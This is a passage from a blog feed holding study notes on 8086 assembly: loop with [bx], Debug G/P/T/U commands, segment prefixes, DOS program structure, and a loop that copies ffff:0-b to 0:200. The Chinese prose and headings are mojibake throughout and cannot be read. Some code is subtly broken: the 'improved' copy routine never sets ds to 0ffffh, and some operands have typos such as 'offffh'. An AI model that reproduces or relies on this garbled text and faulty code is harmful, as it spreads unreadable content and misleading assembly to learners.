cx,å¾ªç¯æ¬¡æ•°<br>s:<br>å¾ªçæ‰§è¡Œçš„ç¨‹åºæ®µ<br>loop s//ï¼ˆcx=cx-1 åˆ¤æ–­cxæ˜¯å¦ä¸º0ï¼‰</p><h1 id="5-3åœ¨Debugä¸­è·Ÿè¸ªç”¨loopæŒ‡ä»¤å®ç°çš„å¾ªç¯ç¨‹åº"><a href="#5-3åœ¨Debugä¸­è·Ÿè¸ªç”¨loopæŒ‡ä»¤å®ç°çš„å¾ªç¯ç¨‹åº" class="headerlink" title="5.3åœ¨Debugä¸­è·Ÿè¸ªç”¨loopæŒ‡ä»¤å®ç°çš„å¾ªç¯ç¨‹åº"></a>5.3åœ¨Debugä¸­è·Ÿè¸ªç”¨loopæŒ‡ä»¤å®ç°çš„å¾ªç¯ç¨‹åº</h1><p>æˆ‘ä»¬è¯´çš„æ˜¯â€œèµ‹å€¼â€ï¼Œå°±æ˜¯è¯´ï¼Œè®©axä¸­çš„æ•°æ®çš„å€¼(æ•°æ®çš„å¤§å°)å’Œffff:0006å•å…ƒä¸­çš„æ•°æ®çš„å€¼(æ•°æ®çš„å¤§å°)ç›¸ç­‰ã€‚<br>8ä½æ•°æ®01Hå’Œ16ä½æ•°æ®0001Hçš„æ•°æ®é•¿åº¦ä¸ä¸€æ ·ï¼Œä½†å®ƒä»¬çš„å€¼æ˜¯ç›¸ç­‰çš„ã€‚</p><h2 id="ä¸èƒ½ç›´æ¥mov-ax-bx-è¦mov-al-bx-â€“mov-ah-0-å¦åˆ™ä¼šå°†ds-bx-å’Œds-bx-1-çš„å€¼èµ‹ç»™ax"><a href="#ä¸èƒ½ç›´æ¥mov-ax-bx-è¦mov-al-bx-â€“mov-ah-0-å¦åˆ™ä¼šå°†ds-bx-å’Œds-bx-1-çš„å€¼èµ‹ç»™ax" class="headerlink" title="ä¸èƒ½ç›´æ¥mov ax,[bx],è¦mov al,[bx]â€“mov ah,0,å¦åˆ™ä¼šå°†ds:[bx]å’Œds:[bx+1]çš„å€¼èµ‹ç»™ax"></a>ä¸èƒ½ç›´æ¥mov ax,[bx],è¦mov al,[bx]â€“mov ah,0,å¦åˆ™ä¼šå°†ds:[bx]å’Œds:[bx+1]çš„å€¼èµ‹ç»™ax</h2><p>æ³¨æ„ç¨‹åºä¸­çš„ç¬¬ä¸€æ¡æŒ‡ä»¤mov ax,0ffffhã€‚<br>æˆ‘ä»¬çŸ¥é“å¤§äº9FFFHçš„åå…­è¿›åˆ¶æ•°æ®A000Hã€A001Hã€â€¦..ã€COOOHã€COO1Hã€ã€FFFEHã€FFFFHç­‰ï¼Œåœ¨ä¹¦å†™çš„æ—¶å€™éƒ½æ˜¯ä»¥å­—æ¯å¼€å¤´çš„ã€‚</p><h2 id="è€Œåœ¨3æ±‡ç¼–æºç¨‹åºä¸­ï¼Œæ•°æ®ä¸èƒ½ä»¥å­—æ¯å¼€å¤´ï¼Œæ‰€ä»¥è¦åœ¨å‰é¢åŠ 0ã€‚"><a href="#è€Œåœ¨3æ±‡ç¼–æºç¨‹åºä¸­ï¼Œæ•°æ®ä¸èƒ½ä»¥å­—æ¯å¼€å¤´ï¼Œæ‰€ä»¥è¦åœ¨å‰é¢åŠ 0ã€‚" class="headerlink" title="è€Œåœ¨3æ±‡ç¼–æºç¨‹åºä¸­ï¼Œæ•°æ®ä¸èƒ½ä»¥å­—æ¯å¼€å¤´ï¼Œæ‰€ä»¥è¦åœ¨å‰é¢åŠ 0ã€‚"></a>è€Œåœ¨3æ±‡ç¼–æºç¨‹åºä¸­ï¼Œæ•°æ®ä¸èƒ½ä»¥å­—æ¯å¼€å¤´ï¼Œæ‰€ä»¥è¦åœ¨å‰é¢åŠ 0ã€‚</h2><p>è°ƒè¯•å¤šæ¬¡ç”¨Gå‘½ä»¤ä¹Ÿå¯ä»¥ç”¨På‘½ä»¤<br>-g XXXX<br>XXXXåç§»åœ°å€<br>-pç›´æ¥å¾ªç¯å®Œ</p><h1 id="5-4debugå’Œæ±‡ç¼–ç¼–è¯‘å™¨MASMå¯¹æŒ‡ä»¤çš„ä¸åŒå¤„ç†"><a href="#5-4debugå’Œæ±‡ç¼–ç¼–è¯‘å™¨MASMå¯¹æŒ‡ä»¤çš„ä¸åŒå¤„ç†" class="headerlink" title="5.4debugå’Œæ±‡ç¼–ç¼–è¯‘å™¨MASMå¯¹æŒ‡ä»¤çš„ä¸åŒå¤„ç†"></a>5.4debugå’Œæ±‡ç¼–ç¼–è¯‘å™¨MASMå¯¹æŒ‡ä»¤çš„ä¸åŒå¤„ç†</h1><p><strong>debugä¸­æ•°å­—é»˜è®¤16è¿›åˆ¶masmä¸­é»˜è®¤10è¿›åˆ¶</strong><br>#5.5 loopå’Œ[bx]çš„è”åˆåº”ç”¨<br>åœ¨åšåŠ æ³•çš„æ—¶å€™ï¼Œæˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•:<br>(dx)=(dx)+å†…å­˜ä¸­çš„8ä½æ•°æ®:<br>(dl)=(dl)+å†…å­˜ä¸­çš„8ä½æ•°æ®;<br>ç¬¬ä¸€ç§æ–¹æ³•ä¸­çš„é—®é¢˜æ˜¯ä¸¤ä¸ªè¿ç®—å¯¹è±¡çš„ç±»å‹ä¸åŒ¹é…ï¼Œç¬¬äºŒç§æ–¹æ³•ä¸­çš„é—®é¢˜æ˜¯ç»“æœæœ‰å¯èƒ½è¶…ç•Œã€‚<br>ç›®å‰çš„æ–¹æ³•(åé¢è¿˜æœ‰åˆ«çš„æ–¹æ³•)å°±æ˜¯å¾—ç”¨ä¸€ä¸ª16ä½å¯„å­˜å™¨æ¥åšä¸­ä»‹ã€‚<br>mov ax,0ffffH<br>mov ds,ax ;è®¾ç½®(ds)=0ffffh<br>mov dx,0 ;åˆå§‹åŒ–ç´ ç´¯åŠ å¯„å­˜å™¨ï¼Œ(dx)=0<br>mov al,ds: [0]<br>mov ah,0 ;(ax)=((ds)*16+0)= (0ffff0h)<br>add dx,ax ;å‘dxä¸­åŠ .ä¸Šoffffh:0å•å…ƒçš„æ•°å€¼</p><p><strong>loopæ”¹è¿›å</strong><br>mov ax,0ffffH<br>mov ds,ax<br>mov dx,0<br>mov bx,0<br>mov cx,000bH<br>s:  mov al,[bx]<br>mov ah,0<br>add dx,ax<br>inc bx<br>loop s<br>5.6 æ®µå‰ç¼€<br>æŒ‡ä»¤â€œmov ax,[bx]â€ä¸­ ï¼Œå†…å­˜å•å…ƒçš„åç§»åœ°å€ç”±bxç»™å‡ºï¼Œè€Œæ®µåœ°å€é»˜è®¤åœ¨dsä¸­ã€‚//dså°±ç§°ä¹‹ä¸ºæ®µå‰ç¼€<br>æˆ‘ä»¬å¯ä»¥åœ¨è®¿é—®å†…å­˜å•å…ƒçš„æŒ‡ä»¤ä¸­æ˜¾å¼åœ°ç»™å‡ºå†…å­˜å•å…ƒçš„æ®µåœ°å€æ‰€åœ¨çš„æ®µå¯„å­˜å™¨ã€‚<br>è¿™äº›å‡ºç°åœ¨è®¿é—®å†…å­˜å•å…ƒçš„æŒ‡ä»¤ä¸­ï¼Œç”¨äºæ˜¾å¼åœ°æŒ‡æ˜å†…å­˜å•å…ƒçš„æ®µåœ°å€çš„â€ds:â€ã€â€cs:â€ã€â€ss:â€æˆ–â€es:â€ï¼Œåœ¨æ±‡ç¼–è¯­è¨€ä¸­ç§°ä¸ºæ®µå‰ç¼€<br>mov ax,cs:[0]<br>mov bx,es:[0]</p><h1 id="5-7ä¸€æ®µå®‰å…¨çš„ç©ºé—´"><a href="#5-7ä¸€æ®µå®‰å…¨çš„ç©ºé—´" class="headerlink" title="5.7ä¸€æ®µå®‰å…¨çš„ç©ºé—´"></a>5.7ä¸€æ®µå®‰å…¨çš„ç©ºé—´</h1><p>åœ¨8086æ¨¡å¼ä¸­ï¼Œéšæ„å‘ä¸€æ®µå†…å­˜ç©ºé—´å†™å…¥å†…å®¹æ˜¯å¾ˆå±é™©çš„ï¼Œå› ä¸ºè¿™æ®µç©ºé—´ä¸­å¯èƒ½å­˜æ”¾ç€é‡è¦çš„ç³»ç»Ÿæ•°æ®æˆ–ä»£ç ã€‚<br><strong>åœ¨ä¸€èˆ¬çš„PCæœºä¸­ï¼ŒDOSæ–¹å¼ä¸‹ï¼ŒDOSå’Œå…¶ä»–åˆæ³•çš„ç¨‹åºä¸€èˆ¬éƒ½ä¸ä¼šä½¿ç”¨0:2000:2FF( 0:200h~0:2FFh) çš„256ä¸ªå­—èŠ‚çš„ç©ºé—´ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬ä½¿ç”¨è¿™æ®µç©ºé—´æ˜¯å®‰å…¨çš„ã€‚</strong></p><h1 id="5-8æ®µå‰ç¼€çš„ä½¿ç”¨"><a href="#5-8æ®µå‰ç¼€çš„ä½¿ç”¨" class="headerlink" title="5.8æ®µå‰ç¼€çš„ä½¿ç”¨"></a>5.8æ®µå‰ç¼€çš„ä½¿ç”¨</h1><p>å°†å†…å­˜ffff:0~ ffff:bå•å…ƒä¸­çš„æ•°æ®æ‹·è´åˆ°0:200<del>0:20bå•å…ƒä¸­ã€‚<br>(1) 0:200</del>0:20bå•å…ƒç­‰åŒäº0020:0 -0020:bå•å…ƒï¼Œå®ƒä»¬æè¿°çš„æ˜¯åŒä¸€æ®µå†…å­˜ç©ºé—´:<br>(2)æ‹·è´çš„è¿‡ç¨‹åº”ç”¨å¾ªç¯å®ç°ï¼Œç®€è¦æè¿°å¦‚ä¸‹:<br>åˆå§‹åŒ–: X=0<br>å¾ªç¯12æ¬¡:<br>å°†fff:Xå•å…ƒä¸­çš„æ•°æ®é€å…¥0020:X(éœ€è¦ç”¨ä¸€ä¸ªå¯„å­˜å™¨ä¸­è½¬)<br>X=X+1<br>(3)åœ¨å¾ªç¯ä¸­ï¼Œæºå•få…ƒff:Xå’Œç›®æ ‡å•å…ƒçš„0020:Xçš„åç§»åœ°å€Xæ˜¯å˜é‡ã€‚æˆ‘ä»¬ç”¨bxæ¥å­˜æ”¾ã€‚<br>(4)æˆ‘ä»¬ç”¨å°†0:200<del>0:20bç”¨0020:0</del>0020:bæè¿°ï¼Œå°±æ˜¯ä¸ºäº†ä½¿ç›®æ ‡å•å…ƒçš„åç§»åœ°å€å’Œæºå§‹å•å…ƒçš„åç§»åœ°å€ä»åŒä¸€æ•°å€¼0å¼€å§‹ã€‚</p><hr><p>assume cs:code<br>code segment<br>mov bx, 0; (bx)=0,åç§»åœ°å€ä»oå¼€å§‹<br>mov cx,12; (cx)=12ï¼Œ å¾ªç¯12æ¬¡<br>s: mov ax,offffh<br>mov ds ,ax; (ds)=Offffh<br>mov dl, [bx] ; (dl)=((ds)*16+(bx))ï¼Œå°†ffff :bxä¸­çš„æ•°æ®é€å…¥dl<br>mov ax,0020h<br>mov ds,ax ; (ds)=0020h<br>mov [bx],dl ; ((ds)*16+ (bx))=(dl)ï¼Œå°†dlçš„æ•°æ®é€å…¥0020:bx<br>inc bx ; (bx)=(bx) +1<br>loop s<br>mov ax,4c00h<br>int 21h<br>code ends<br>end</p><hr><p>æ”¹è¿›<br>assume cs:code<br>code segment<br>mov ax,0ffffH<br>mov ax,0020h<br>mov es,ax<br>mov bx,0<br>mov cx,12<br>s: mov dl,[bx]<br>mov es:[bx],dl<br>inc bx<br>loop s</p><p>mov ax,4c00h<br>int 21h<br>code ends<br>end</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BX-å’ŒloopæŒ‡ä»¤&quot;&gt;&lt;a href=&quot;#BX-å’ŒloopæŒ‡ä»¤&quot; class=&quot;headerlink&quot; title=&quot;[BX]å’ŒloopæŒ‡ä»¤&quot;&gt;&lt;/a&gt;[BX]å’ŒloopæŒ‡ä»¤&lt;/h1&gt;&lt;h1 id=&quot;5-1-bx&quot;&gt;&lt;a href=&quot;#5-1-bx&quot; class</summary>
      
    
    
    
    <category term="æ±‡ç¼–" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
  </entry>
  
  <entry>
    <title>æ±‡ç¼–ç¬¬å››ç« </title>
    <link href="http://example.com/2020/02/12/%E6%B1%87%E7%BC%96%E7%AC%AC%E5%9B%9B%E7%AB%A0/"/>
    <id>http://example.com/2020/02/12/%E6%B1%87%E7%BC%96%E7%AC%AC%E5%9B%9B%E7%AB%A0/</id>
    <published>2020-02-12T05:56:00.000Z</published>
    <updated>2021-08-13T07:33:45.804Z</updated>
    
    <content type="html"><![CDATA[<h1 id="4-1ä¸€ä¸ªæ±‡ç¼–è¯­è¨€ç¨‹åºï¼ˆæºç¨‹åºï¼‰ä»å†™å‡ºåˆ°æ‰§è¡Œçš„è¿‡ç¨‹"><a href="#4-1ä¸€ä¸ªæ±‡ç¼–è¯­è¨€ç¨‹åºï¼ˆæºç¨‹åºï¼‰ä»å†™å‡ºåˆ°æ‰§è¡Œçš„è¿‡ç¨‹" class="headerlink" title="4.1ä¸€ä¸ªæ±‡ç¼–è¯­è¨€ç¨‹åºï¼ˆæºç¨‹åºï¼‰ä»å†™å‡ºåˆ°æ‰§è¡Œçš„è¿‡ç¨‹"></a>4.1ä¸€ä¸ªæ±‡ç¼–è¯­è¨€ç¨‹åºï¼ˆæºç¨‹åºï¼‰ä»å†™å‡ºåˆ°æ‰§è¡Œçš„è¿‡ç¨‹</h1><p>ç¼–å†™-&gt;ç¼–è¯‘è¿æ¥-&gt;æ‰§è¡Œ<br>(2)ä½¿ç”¨æ±‡ç¼–è¯­è¨€ç¼–è¯‘ç¨‹åºï¼ˆMASM.EXEï¼‰å¯¹æºç¨‹åºæ–‡ä»¶ä¸­çš„æºç¨‹åºè¿›è¡Œç¼–è¯‘ï¼Œäº§ç”Ÿç›®æ ‡æ–‡ä»¶ï¼›å†ç”¨è¿æ¥ç¨‹åºï¼ˆLINK.EXEï¼‰å¯¹ç›®æ ‡æ–‡ä»¶è¿›è¡Œè¿æ¥ï¼Œç”Ÿæˆå¯åœ¨æ“ä½œç³»ç»Ÿä¸­ç›´æ¥è¿è¡Œçš„è¯¾æ‰§è¡Œæ–‡ä»¶ã€‚<br>å¯æ‰§è¡Œæ–‡ä»¶ä¸­åŒ…å«ä¸¤éƒ¨åˆ†<br>ç¨‹åºå’Œæ•°æ®<br>ç›¸å…³ä¿¡æ¯ï¼ˆç¨‹åºå¤§å°ï¼‰<br>(3)æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¨‹åº<br>æ“ä½œç³»ç»Ÿä¾ç…§å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„æè¿°ä¿¡æ¯ï¼Œå°†å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„æœºå™¨ç å’Œæ•°æ®å«è½½å…¥å†…å­˜ï¼Œå¹¶è¿›è¡Œç›¸å…³çš„åˆå§‹åŒ–ï¼ˆæ¯”å¦‚ï¼šè®¾ç½®CSï¼šIPæŒ‡å‘ç¬¬ä¸€æ¡è¦æ‰§è¡Œçš„æŒ‡ä»¤ï¼‰ï¼Œç„¶åç”±CPUæ‰§è¡Œç¨‹åºã€‚</p><h1 id="4-2-æºç¨‹åº"><a href="#4-2-æºç¨‹åº" class="headerlink" title="4.2 æºç¨‹åº"></a>4.2 æºç¨‹åº</h1><h2 id="INT-21Hæ˜¯DOSçš„ä¸­æ–­è°ƒç”¨"><a href="#INT-21Hæ˜¯DOSçš„ä¸­æ–­è°ƒç”¨" class="headerlink" title="INT 21Hæ˜¯DOSçš„ä¸­æ–­è°ƒç”¨"></a><em>INT</em> <em>21H</em>æ˜¯DOSçš„ä¸­æ–­è°ƒç”¨</h2><p><a href="https://blog.csdn.net/chinazeze/article/details/1735621">https://blog.csdn.net/chinazeze/article/details/1735621</a></p><p>assume cs:codesg</p><p>codesg segment<br>  start: mov ax,0123H<br>         mov bx,0456H<br>         add ax,bx<br>         add ax,ax<br>         mov ax,4c00h<br>         int 21h</p><p>codesg ends<br>end start</p><p>æ±‡ç¼–æŒ‡ä»¤<br>æœ‰å¯¹åº”çš„æœºå™¨ç çš„æŒ‡ä»¤ï¼Œå¯ä»¥è¢«ç¼–è¯‘ä½æœºå™¨æŒ‡ä»¤ï¼Œæœ€ç»ˆä¸ºCPUæ‰€æ‰§è¡Œ<br>// mov add sub jmp<br>ä¼ªæŒ‡ä»¤<br>é™¤äº†æ±‡ç¼–æŒ‡ä»¤ï¼Œåˆ«çš„éƒ½æ˜¯ä¼ªæŒ‡ä»¤<br>æ²¡æœ‰å¯¹åº”çš„æœºå™¨ç çš„æŒ‡ä»¤ï¼Œæœ€ç»ˆä¸è¢«CPUæ‰€æ‰§è¡Œ<br>ä¼ªæŒ‡ä»¤æ˜¯ç”±ç¼–è¯‘å™¨æ¥æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œç¼–è¯‘å™¨æ ¹æ®ä¼ªæŒ‡ä»¤æ¥è¿›è¡Œç›¸å…³çš„ç¼–è¯‘å·¥ä½œ<br>XXX segment<br>XXX ends<br>end //æ˜¯ä¸€ä¸ªç¼–è¯‘ç¨‹åºçš„ç»“æŸæ ‡è®°ï¼Œè®°å¾—åœ¨ç»“å°¾åŠ <br>assume //å¯„å­˜å™¨ä¸æ®µçš„å…³è”å‡è®¾<br>å®šä¹‰ä¸€ä¸ªæ®µ<br>segmentå’Œendsæ˜¯ä¸€å¯¹æˆå¯¹ä½¿ç”¨çš„ä¼ªæŒ‡ä»¤ï¼Œè¿™æ˜¯åœ¨å†™å¯è¢«ç¼–è¯‘å™¨ç¼–è¯‘çš„æ±‡ç¼–ç¨‹åºæ—¶ï¼Œå¿…è¦ç”¨åˆ°çš„ä¸€å¯¹ä¼ªæŒ‡ä»¤ã€‚<br>segmentå’Œendsçš„åŠŸèƒ½æ˜¯å®šä¹‰ä¸€ä¸ªæ®µï¼Œsegmentè¯´æ˜ä¸€ä¸ªæ®µçš„å¼€å§‹ï¼Œendsè¯´æ˜ä¸€ä¸ªæ®µç»“æŸã€‚<br>ä¸€ä¸ªæ±‡ç¼–ç¨‹åºæ˜¯ç”±å¤šä¸ªæ®µç»„æˆçš„ï¼Œè¿™äº›æ®µè¢«ç”¨æ¥å­˜æ”¾ä»£ç ã€æ•°æ®æˆ–å½“ä½œæ ˆç©ºé—´æ¥ä½¿ç”¨ã€‚<br>æ±‡ç¼–æºç¨‹åº:<br>      ä¼ªæŒ‡ä»¤ ï¼ˆç¼–è¯‘å™¨å¤„ç†ï¼‰<br>      æ±‡ç¼–æŒ‡ä»¤ï¼ˆç¼–è¯‘ä¸ºæœºå™¨ç ï¼‰</p><p>æºç¨‹åºæ–‡ä»¶ä¸­çš„æ‰€æœ‰å†…å®¹ç§°ä¸ºæºç¨‹åºï¼Œå°†æºç¨‹åºä¸­æœ€ç»ˆç”±è®¡ç®—æœºæ‰§è¡Œå¤„ç†çš„æŒ‡ä»¤æˆ–æ•°æ®ç§°ä¸ºç¨‹åºã€‚<br><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210719101519.jpeg" alt="17xmEn.jpg"><br>æ ‡å·<br>æ ‡å·æŒ‡ä»£äº†ä¸€ä¸ªåœ°å€</p><p>Codesg:æ”¾åœ¨segmentçš„å‰é¢ï¼Œä½œä¸ºä¸€ä¸ªæ®µçš„åç§°<br>  assume name<br>  name segment<br>  mov ax,2<br>  add ax,ax<br>  add ax,ax<br>  name ends<br>  end</p><p>DOSä¸­çš„ç¨‹åºè¿è¡Œ<br>DOSæ˜¯ä¸€ä¸ªä½†ä»»åŠ¡æ“ä½œç³»ç»Ÿã€‚<br>ç¨‹åºè¿”å›<br>åº”è¯¥åœ¨ç¨‹åºçš„æœ«å°¾æ·»åŠ è¿”å›çš„ç¨‹åºæ®µ<br>mov ax,4c00H<br>int 21H<br>è¿™ä¸¤æ¡æŒ‡ä»¤æ‰€å®ç°çš„åŠŸèƒ½å°±æ˜¯ç¨‹åºè¿”å›ã€‚<br>Masm 1.asm;<br>Link 1.obj;<br>1.exe<br>è¿æ¥çš„ä½œç”¨<br>å½“æºç¨‹åºå¾ˆå¤§æ—¶ï¼Œå¯ä»¥å°†å®ƒåˆ†ä¸ºå¤šä¸ªæºç¨‹åºæ–‡ä»¶æ¥ç¼–è¯‘ï¼Œæ¯ä¸ªæºæ–‡ä»¶ç¼–è¯‘æˆä¸ºç›®æ ‡æ–‡ä»¶åï¼Œå†ç”¨è¿æ¥ç¨‹åºå°†å®ƒä»¬è¿æ¥åˆ°ä¸€èµ·ï¼Œç”Ÿæˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼›<br>ç¨‹åºä¸­è°ƒç”¨äº†æŸä¸ªåº“æ–‡ä»¶ä¸­çš„å­ç¨‹åºï¼Œéœ€è¦å°†è¿™ä¸ªåº“æ–‡ä»¶çš„è¯¥ç¨‹åºç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶è¿æ¥åˆ°ä¸€èµ·ï¼Œç”Ÿæˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼›</p><p>å¯¹äºè¿æ¥çš„è¿‡ç¨‹ï¼Œå¯æ‰§è¡Œæ–‡ä»¶æ˜¯æˆ‘ä»¬è¦å¾—åˆ°çš„æœ€ç»ˆç»“æœ</p><h1 id="4-8å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¨‹åºè£…å…¥å†…å­˜å¹¶è¿è¡Œçš„åŸç†"><a href="#4-8å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¨‹åºè£…å…¥å†…å­˜å¹¶è¿è¡Œçš„åŸç†" class="headerlink" title="4.8å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¨‹åºè£…å…¥å†…å­˜å¹¶è¿è¡Œçš„åŸç†"></a>4.8å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¨‹åºè£…å…¥å†…å­˜å¹¶è¿è¡Œçš„åŸç†</h1><p>åœ¨DOSä¸­ï¼Œå¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¨‹åºP1è‹¥è¦è¿è¡Œï¼Œå¿…é¡»æœ‰ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„ç¨‹åºP2ï¼Œå°†P1ä»å¯æ‰§è¡Œæ–‡ä»¶ä¸­åŠ è½½å…¥å†…å­˜ï¼Œå°†CPUçš„æ§åˆ¶æƒäº¤ç»™å®ƒï¼ŒP1æ‰èƒ½å¾—ä»¥è¿è¡Œï¼›<br>å½“P1è¿è¡Œå®Œæ¯•åï¼Œåº”è¯¥å°†CPUçš„æ§åˆ¶æƒäº¤ç»™ä½¿å®ƒå¾—ä»¥è¿è¡Œçš„ç¨‹åºP2</p><p>æ“ä½œç³»ç»Ÿçš„å¤–å£³<br>æ“ä½œç³»ç»Ÿæ˜¯ç”±å¤šä¸ªåŠŸèƒ½æ¨¡å—ç»„æˆçš„åºå¤§ã€å¤æ‚çš„è½¯ä»¶ç³»ç»Ÿã€‚ä»»ä½•é€šç”¨çš„æ“ä½œç³»ç»Ÿï¼Œéƒ½è¦æä¾›ä¸€ä¸ªç§°ä¸ºshellï¼ˆå¤–å£³ï¼‰çš„ç¨‹åºï¼Œç”¨æˆ·ï¼ˆæ“ä½œäººå‘˜ï¼‰ä½¿ç”¨è¿™ä¸ªç¨‹åºæ¥æ“ä½œè®¡ç®—æœºç³»ç»Ÿå·¥ä½œã€‚<br>ï¼ˆcmdï¼‰</p><p><strong>ç¼–ç¨‹-&gt;1.asm-&gt;ç¼–è¯‘-&gt;1.obj-&gt;è¿æ¥-&gt;1.exe-&gt;åŠ è½½-&gt;å†…å­˜ä¸­çš„ç¨‹åº-&gt;è¿è¡Œ</strong><br>  Edit         masm       link        command            cpu</p><h1 id="4-9ç¨‹åºæ‰§è¡Œè¿‡ç¨‹çš„è·Ÿè¸ª"><a href="#4-9ç¨‹åºæ‰§è¡Œè¿‡ç¨‹çš„è·Ÿè¸ª" class="headerlink" title="4.9ç¨‹åºæ‰§è¡Œè¿‡ç¨‹çš„è·Ÿè¸ª"></a>4.9ç¨‹åºæ‰§è¡Œè¿‡ç¨‹çš„è·Ÿè¸ª</h1><p>Debugå¯ä»¥å°†ç¨‹åºè½½å…¥å†…å­˜ï¼Œè®¾ç½®CS:IPæŒ‡å‘ç¨‹åºçš„å…¥å£ï¼Œä½†Debugå¹¶ä¸æ”¾å¼ƒå¯¹CPUçš„æ§åˆ¶ï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨Debugçš„ç›¸å…³å‘½ä»¤æ¥å•æ­¥æ‰§è¡Œç¨‹åºï¼ŒæŸ¥çœ‹æ¯ä¸€æ¡æŒ‡ä»¤çš„æ‰§è¡Œç»“æœ<br><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210719101532.jpeg" alt="17xdC6.jpg"><br>PSPå 256ï¼ˆ100Hï¼‰å­—èŠ‚ï¼Œæ‰€ä»¥ç¨‹åºçš„ç‰©ç†åœ°å€æ˜¯ï¼š<br>SA<em>16+0+256=SA</em>16+16*16=ï¼ˆSA+16)*16+0<br>ç”¨uå‘½ä»¤æŸ¥çœ‹ä¸€ä¸‹å…¶ä»–æŒ‡ä»¤<br>-u 103e:0 100H<br>ç”¨Tå‘½ä»¤æ¥å•æ­¥æ‰§è¡Œä¸æŸ¥çœ‹æ¯æ¡æŒ‡ä»¤<br><strong>åˆ°äº†int 21ï¼Œæˆ‘ä»¬è¦ç”¨På‘½ä»¤æ‰§è¡Œ</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;4-1ä¸€ä¸ªæ±‡ç¼–è¯­è¨€ç¨‹åºï¼ˆæºç¨‹åºï¼‰ä»å†™å‡ºåˆ°æ‰§è¡Œçš„è¿‡ç¨‹&quot;&gt;&lt;a href=&quot;#4-1ä¸€ä¸ªæ±‡ç¼–è¯­è¨€ç¨‹åºï¼ˆæºç¨‹åºï¼‰ä»å†™å‡ºåˆ°æ‰§è¡Œçš„è¿‡ç¨‹&quot; class=&quot;headerlink&quot; title=&quot;4.1ä¸€ä¸ªæ±‡ç¼–è¯­è¨€ç¨‹åºï¼ˆæºç¨‹åºï¼‰ä»å†™å‡ºåˆ°æ‰§è¡Œçš„è¿‡ç¨‹&quot;&gt;&lt;/a&gt;4.1ä¸€ä¸ªæ±‡ç¼–è¯­è¨€ç¨‹åº</summary>
      
    
    
    
    <category term="æ±‡ç¼–" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
  </entry>
  
  <entry>
    <title>æ±‡ç¼–ç¬¬ä¸‰ç« </title>
    <link href="http://example.com/2020/01/16/%E6%B1%87%E7%BC%96%E7%AC%AC%E4%B8%89%E7%AB%A0/"/>
    <id>http://example.com/2020/01/16/%E6%B1%87%E7%BC%96%E7%AC%AC%E4%B8%89%E7%AB%A0/</id>
    <published>2020-01-16T04:14:31.000Z</published>
    <updated>2021-08-13T07:33:40.984Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ•°æ®éƒ½ä¸èƒ½å’Œæ®µåœ°å€å‘ç”Ÿç›´æ¥æ›¿æ¢ï¼Œè¦å€Ÿç”¨å¯„å­˜å™¨"><a href="#æ•°æ®éƒ½ä¸èƒ½å’Œæ®µåœ°å€å‘ç”Ÿç›´æ¥æ›¿æ¢ï¼Œè¦å€Ÿç”¨å¯„å­˜å™¨" class="headerlink" title="æ•°æ®éƒ½ä¸èƒ½å’Œæ®µåœ°å€å‘ç”Ÿç›´æ¥æ›¿æ¢ï¼Œè¦å€Ÿç”¨å¯„å­˜å™¨"></a>æ•°æ®éƒ½ä¸èƒ½å’Œæ®µåœ°å€å‘ç”Ÿç›´æ¥æ›¿æ¢ï¼Œè¦å€Ÿç”¨å¯„å­˜å™¨</h1><h1 id="Debugçš„Tå‘½ä»¤åœ¨æ‰§è¡Œä¿®æ”¹å¯„å­˜å™¨SSçš„æŒ‡ä»¤æ—¶ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤ä¹Ÿè¦ç´§æ¥ç€è¢«æ‰§è¡Œ"><a href="#Debugçš„Tå‘½ä»¤åœ¨æ‰§è¡Œä¿®æ”¹å¯„å­˜å™¨SSçš„æŒ‡ä»¤æ—¶ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤ä¹Ÿè¦ç´§æ¥ç€è¢«æ‰§è¡Œ" class="headerlink" title="Debugçš„Tå‘½ä»¤åœ¨æ‰§è¡Œä¿®æ”¹å¯„å­˜å™¨SSçš„æŒ‡ä»¤æ—¶ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤ä¹Ÿè¦ç´§æ¥ç€è¢«æ‰§è¡Œ"></a>Debugçš„Tå‘½ä»¤åœ¨æ‰§è¡Œä¿®æ”¹å¯„å­˜å™¨SSçš„æŒ‡ä»¤æ—¶ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤ä¹Ÿè¦ç´§æ¥ç€è¢«æ‰§è¡Œ</h1><h1 id="3-1-å†…å­˜ä¸­å­—çš„å­˜å‚¨"><a href="#3-1-å†…å­˜ä¸­å­—çš„å­˜å‚¨" class="headerlink" title="3.1  å†…å­˜ä¸­å­—çš„å­˜å‚¨"></a>3.1  å†…å­˜ä¸­å­—çš„å­˜å‚¨</h1><p>å­˜æ”¾æ–¹å¼<br>åœ¨0åœ°å€å¤„å¼€å§‹å­˜æ”¾20000ï¼ˆ4E20Hï¼‰<br>0   | 20H<br>1   | 4EH<br>2   | 12H<br>3   | 00H<br>4   |<br>5   